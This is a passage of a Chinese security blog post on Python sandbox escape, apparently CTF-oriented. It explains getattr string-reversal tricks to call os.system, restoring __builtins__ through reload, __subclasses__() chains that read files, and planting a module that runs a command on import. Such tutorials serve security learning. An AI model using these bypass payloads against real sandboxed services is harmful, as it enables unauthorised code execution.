+<span class="token builtin">getattr</span><span class="token punctuation">(</span>os<span class="token punctuation">,</span> <span class="token string">'metsys'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>
+<span class="token comment">#如果ban了import</span>
+<span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>__builtins__<span class="token punctuation">,</span> <span class="token string">'__tropmi__'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'so'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'metsys'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>与<code>getattr</code>相似的还有<code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性&#x2F;方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。</p>
+<h3 id="builtin与builtins"><a href="#builtin与builtins" class="headerlink" title="builtin与builtins"></a><strong>builtin</strong>与<strong>builtins</strong></h3><p><code>builtin</code>、<code>builtins</code>，<code>__builtin__</code>与<code>__builtins__</code>的区别：在python中，存在一些不需要任何import即可使用的函数，如chr、open等，这都得益于python的内建模块，亦称内建命名空间，它包含了一些常用函数、变量和类。</p>
+<p>而在2.x中，内建模块被命名为<code>__builtin__</code>，而在3.x中，则变成了builtins。</p>
+<p><strong>两者都需要import</strong>。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#2.x</span>
+<span class="token operator">>></span><span class="token keyword">import</span> __builtin__
+<span class="token operator">>></span>__builitin__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../source/images/paython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/python2builtins.png"
+                     
+                ></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#3.x</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> builtins
+<span class="token operator">>></span><span class="token operator">></span> builtins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../../source/images/paython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/python3builtins%20.png"
+                     
+                ></p>
+<p>但是，对于2.x和3.x，<code>__builtins__</code>两者都有。</p>
+<p>如果builtins内部的reload没被删除，可以使用reload恢复<code>__builtins__</code>，从而恢复<code>__builtins__</code>中被删除的危险函数（eval…），如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。</p>
+<pre class="line-numbers language-none"><code class="language-none">2.x 的&#96;reload&#96;是内建的，3.x 需要&#96;import imp&#96;，然后再&#96;imp.reload&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="继承关系逃逸"><a href="#继承关系逃逸" class="headerlink" title="继承关系逃逸"></a>继承关系逃逸</h3><p>首先，我们要理解python的继承机制，与java等语言不同，python是支持多重继承的，也就是可以拥有<strong>多个父类。</strong></p>
+<p>python中新式类都有个属性（mro）是一个元组，记录了类的继承关系。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
+<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>
+<span class="token comment">#这里说的继承，注意是类型,而不是类型的实例</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>通过这种方法，我们可以得到一些类型的对象，这个对于一些限制极严的情况下有很大的用处。</p>
+<ul>
+<li>比如说当一些文件操作的函数和类型被过滤的情况下，我们就可以使用以下这段payload。</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>在2.x中，有个内建file可以直接读取文件，但是在3.x中file被移除了，可以用open（2.x&#x2F;3.x通用）</p>
+<p>还有一些库可以实现读写</p>
+<ul>
+<li><code>types.FileType</code>(rw)</li>
+<li><code>platform.popen</code>(rw)</li>
+<li><code>linecache.getlines</code>(r)</li>
+</ul>
+<p>当我们可以直接写文件时，不妨先把类似的文件保存写好（xx.py），然后再import（或其他方法）引用进来。</p>
+<pre class="line-numbers language-none"><code class="language-none">xx.py:         #注：xx命名最好要挑选一个常用的标准库的名字，因为过滤的库名可能采用的是白名单的方式。但是不能和sys.modules中的库重复。否则无法正常利用，python会直接从sys.modules中加入
+	import os
+	print(os.system(&#39;whoami&#39;))
+&gt;&gt;&gt; import math
+root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; &#39;re&#39; in sys.modules<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<p>True</p>
+<p>​	‘math’ in sys.modules</p>
+<p>False</p>
+<p>还有部分与ssti模板注入的绕过方式大差不差，可以看看之前的记录。</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> python沙箱逃逸</li>
+        <li><strong>Author:</strong> 阿巴</li>
+        <li><strong>Created at:</strong> 2023-08-20 09:50:17</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2023-08-20 09:50:40
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2023/08/20/paython沙箱逃逸/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">#web安全</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/08/20/ctfshow%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">ctfshow—命令执行</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/08/20/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item"></span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">python沙箱逃逸</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-text">python沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1"><span class="nav-text">沙箱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="nav-text">沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80python%E7%9F%A5%E8%AF%86"><span class="nav-text">基础python知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87"><span class="nav-text">基础防御绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="nav-text">执行函数过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#builtin%E4%B8%8Ebuiltins"><span class="nav-text">builtin与builtins</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8"><span class="nav-text">继承关系逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="nav-text">文件读写</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>Invalid date</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">阿巴</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.2.2</a>
+        </div>
+        
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
